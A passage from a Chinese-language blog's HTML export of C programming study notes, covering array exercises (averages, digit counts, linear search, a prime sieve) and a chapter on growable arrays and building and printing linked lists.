</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    double sum = 0;</span><br><span class="line">    int count = 0;</span><br><span class="line">    int number[100];    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);        </span><br><span class="line">    while(x != -1)&#123;</span><br><span class="line">        number[count] = x;</span><br><span class="line">        sum += x;</span><br><span class="line">        count ++;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    if(count&gt;0)&#123;</span><br><span class="line">        printf(&quot;%f\n&quot;,sum/count);</span><br><span class="line">        int i;</span><br><span class="line">        for(i=0;i&lt;count;i++)&#123;</span><br><span class="line">            if(number[i]&gt;sum/count)&#123;</span><br><span class="line">                printf(&quot;%d\n&quot;,number[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：数据超过100时咋办？</p></blockquote><ul><li>Plan A：采用动态的下标</li><li>Plan B：进行说明，if 判断</li></ul><p>## 049 统计个数</p><p>【题目】写一个程序，输入数量不确定的[0,9]范围内的整数，统计每一种数字出现的次数，输入-1表示结束</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    int count[10];</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        count[i]=0;</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    while(x!=-1)&#123;</span><br><span class="line">        if(x&gt;=0&amp;&amp;x&lt;=9)&#123;</span><br><span class="line">            count[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        printf(&quot;%d:%d\n&quot;,i,count[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    const int number = 10;</span><br><span class="line">    int x;</span><br><span class="line">    int count[number];</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;number;i++)&#123;</span><br><span class="line">        count[i]=0;</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    while(x!=-1)&#123;</span><br><span class="line">        if(x&gt;=0&amp;&amp;x&lt;=9)&#123;</span><br><span class="line">            count[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;number;i++)&#123;</span><br><span class="line">        printf(&quot;%d:%d\n&quot;,i,count[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="050-搜索数字"><a href="#050-搜索数字" class="headerlink" title="050 搜索数字"></a>050 搜索数字</h2><p>【题目】查找数字是否在数组中，找到返回在数组中的位置，找不到返回-1</p><p>【代码】</p><ul><li>Example 01：使用数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int search(int key,int a[],int length);//声明 </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int a[] = &#123;2,4,6,7,1,3,&#125;;</span><br><span class="line">    int x;</span><br><span class="line">    int loc;</span><br><span class="line">    printf(&quot;请输入一个数字：&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    loc = search(x,a,sizeof(a)/sizeof(a[0]));</span><br><span class="line">    if(loc != -1)&#123;</span><br><span class="line">        printf(&quot;%d在第%d个位置上\n&quot;,x,loc);</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        printf(&quot;%d不存在\n&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int search(int key,int a[],int length)&#123;</span><br><span class="line">    int result = -1;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;length;i++)&#123;</span><br><span class="line">        if(a[i] == key)&#123;</span><br><span class="line">            result = i;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="051-素数表"><a href="#051-素数表" class="headerlink" title="051 素数表"></a>051 素数表</h2><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    const int maxNumber = 100;</span><br><span class="line">    int isPrime[maxNumber];</span><br><span class="line">    int i;</span><br><span class="line">    int x;</span><br><span class="line">    for(i=0;i&lt;maxNumber;i++)&#123;</span><br><span class="line">        isPrime[i] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for(x=2;x&lt;maxNumber;x++)&#123;</span><br><span class="line">        if(isPrime[x])&#123;</span><br><span class="line">            for(i=2;i*x&lt;maxNumber;i++)&#123;</span><br><span class="line">                isPrime[i*x] = 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=2;i&lt;maxNumber;i++)&#123;</span><br><span class="line">        if(isPrime[i])&#123;</span><br><span class="line">            printf(&quot;%d\t&quot;,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记第十章 链表</title>
      <link href="/44.html"/>
      <url>/44.html</url>
      
        <content type="html"><![CDATA[<h3 id="10-1-可变数组"><a href="#10-1-可变数组" class="headerlink" title="10.1 可变数组"></a>10.1 可变数组</h3><ul><li><p>Example 01：</p><ul><li>array.h</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _ARRAY_H_</span><br><span class="line">#define _ARRAY_H_</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    int *array;</span><br><span class="line">    int size;</span><br><span class="line">&#125;Array;</span><br><span class="line">#define BLOCK_SIZE 20</span><br><span class="line">Array array_create(int init_size);</span><br><span class="line">void array_free(Array *a);</span><br><span class="line">int array_size(const Array *a);</span><br><span class="line">int *array_at(Array *a,int index);</span><br><span class="line">void array_inflate(Array *a,int more_size);</span><br><span class="line">int array_get(const Array *a,int index);</span><br><span class="line">void array_set(Array *a,int index,int value);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><ul><li>array.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;array.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">//typedef struct &#123;</span><br><span class="line">//int *array;</span><br><span class="line">//int size;</span><br><span class="line">//&#125;Array;</span><br><span class="line">Array array_create(int init_size)&#123;</span><br><span class="line">    Array a;</span><br><span class="line">    a.size = init_size;</span><br><span class="line">    a.array = (int *)malloc(sizeof(int)*a.size);</span><br><span class="line">    return a;</span><br><span class="line">&#125;</span><br><span class="line">void array_free(Array *a)&#123;</span><br><span class="line">    free(a-&gt;array);</span><br><span class="line">    a-&gt;array = NULL;</span><br><span class="line">    a-&gt;size = 0;</span><br><span class="line">&#125;</span><br><span class="line">int array_size(const Array *a)&#123;</span><br><span class="line">    return a-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line">int *array_at(Array *a,int index)&#123;</span><br><span class="line">    if(index&gt;=a-&gt;size)&#123;</span><br><span class="line">        //array_inflate(a,index-a-&gt;size+1);</span><br><span class="line">        array_inflate(a,(index/BLOCK_SIZE +1)*BLOCK_SIZE-a-&gt;size);</span><br><span class="line">    &#125;</span><br><span class="line">    return &amp;(a-&gt;array[index]);</span><br><span class="line">&#125;</span><br><span class="line">//可变字符自动按块增长</span><br><span class="line">void array_inflate(Array *a,int more_size)&#123;</span><br><span class="line">    int *p = (int *)malloc(sizeof(int)*(a-&gt;size + more_size));</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;a-&gt;size;i++)&#123;</span><br><span class="line">        p[i] = a-&gt;array[i];</span><br><span class="line">    &#125;</span><br><span class="line">    free(a-&gt;array);</span><br><span class="line">    a-&gt;array = p;</span><br><span class="line">    a-&gt;size += more_size;</span><br><span class="line">&#125;</span><br><span class="line">int array_get(const Array *a,int index)&#123;</span><br><span class="line">    return a-&gt;array[index];</span><br><span class="line">&#125;</span><br><span class="line">void array_set(Array *a,int index,int value)&#123;</span><br><span class="line">    a-&gt;array[index] = value;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    Array a = array_create(100);</span><br><span class="line">    printf(&quot;%d\n&quot;,array_size(&amp;a));</span><br><span class="line">    printf(&quot;%d\n&quot;,a.size);</span><br><span class="line">    *array_at(&amp;a,0) = 10;</span><br><span class="line">    printf(&quot;%d\n&quot;,*array_at(&amp;a,0));</span><br><span class="line">    int number;</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    while(number != -1)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number!=-1)&#123;</span><br><span class="line">        *array_at(&amp;a,cnt++) = number;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    array_free(&amp;a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可变数组的缺陷</p></blockquote><ul><li>要 copy，不能充分利用</li></ul><h3 id="10-2-链表存储数据"><a href="#10-2-链表存储数据" class="headerlink" title="10.2 链表存储数据"></a>10.2 链表存储数据</h3><blockquote><p>链表存储数据 add</p></blockquote><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">int main()&#123;</span><br><span class="line">    Node *head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            //    add to linkList</span><br><span class="line">            Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">            p-&gt;value = number;</span><br><span class="line">            p-&gt;next = NULL;</span><br><span class="line">            //    find the last</span><br><span class="line">            Node *last = head;</span><br><span class="line">            if(last)&#123;</span><br><span class="line">                while(last-&gt;next)&#123;</span><br><span class="line">                last = last-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                //    attach</span><br><span class="line">                last-&gt;next = p;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                head = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：对 01 进行改进</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">Node* add(Node *head, int number);</span><br><span class="line">int main()&#123;</span><br><span class="line">    Node *head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            head = add(head,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">Node* add(Node *head, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = head;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        head = p;</span><br><span class="line">    &#125;</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：对 01 进行改进</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">Node* add(Node **pHead, int number);</span><br><span class="line">int main()&#123;</span><br><span class="line">    Node *head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            head = add(&amp;head,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">Node* add(Node **pHead, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = *pHead;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        *pHead = p;</span><br><span class="line">    &#125;</span><br><span class="line">    return *pHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：对 02 进行改进</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">typedef struct _list&#123;</span><br><span class="line">    Node *head;</span><br><span class="line">&#125;List;</span><br><span class="line">void add(List *pList, int number);</span><br><span class="line">int main()&#123;</span><br><span class="line">    List list;</span><br><span class="line">    list.head = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            add(&amp;list,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void add(List *pList, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = pList-&gt;head;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        pList-&gt;head = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 04：对 03 进行改进</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">typedef struct _list&#123;</span><br><span class="line">    Node *head;</span><br><span class="line">    Node *tail;</span><br><span class="line">&#125;List;</span><br><span class="line">void add(List *pList, int number);</span><br><span class="line">int main()&#123;</span><br><span class="line">    List list;</span><br><span class="line">    list.head = list.tail = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            add(&amp;list,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>待完善：list.tail</p></blockquote><h3 id="10-3-链表输出数据"><a href="#10-3-链表输出数据" class="headerlink" title="10.3 链表输出数据"></a>10.3 链表输出数据</h3><blockquote><p>链表输出数据 print</p></blockquote><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct _node&#123;</span><br><span class="line">    int value;</span><br><span class="line">    struct _node *next;</span><br><span class="line">&#125;Node;</span><br><span class="line">typedef struct _list&#123;</span><br><span class="line">    Node *head;</span><br><span class="line">    Node *tail;</span><br><span class="line">&#125;List;</span><br><span class="line">void add(List *pList, int number);</span><br><span class="line">int main()&#123;</span><br><span class="line">    List list;</span><br><span class="line">    list.head = list.tail = NULL;</span><br><span class="line">    int number;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            add(&amp;list,number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(number != -1);</span><br><span class="line">    Node *p;</span><br><span class="line">    //遍历输出 </span><br><span class="line">    for(p=list.head;p;p=p-&gt;next)&#123;</span><br><span class="line">        printf(&quot;%d\t&quot;,p-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void add(List *pList, int number)&#123;</span><br><span class="line">    //    add to linkList</span><br><span class="line">    Node *p = (Node*)malloc(sizeof(Node));</span><br><span class="line">    p-&gt;value = number;</span><br><span class="line">    p-&gt;next = NULL;</span><br><span class="line">    //    find the last</span><br><span class="line">    Node *last = pList-&gt;head;</span><br><span class="line">    if(last)&#123;</span><br><span class="line">        while(last-&gt;next)&#123;</span><br><span class="line">        last = last-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        //    attach</span><br><span class="line">        last-&gt;next = p;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        pList-&gt;head = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：对 01 进行优化</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 